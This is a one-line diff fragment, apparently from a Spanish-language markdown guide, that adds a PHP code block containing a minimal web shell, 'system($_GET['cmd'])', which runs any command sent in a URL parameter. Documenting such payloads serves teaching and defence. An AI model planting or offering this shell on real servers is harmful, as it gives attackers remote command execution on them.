@@ -152,7 +152,7 @@ Existen variantes...
 
 ```php
 
-
+<?php system($_GET['cmd']); ?>
 
 ```
 
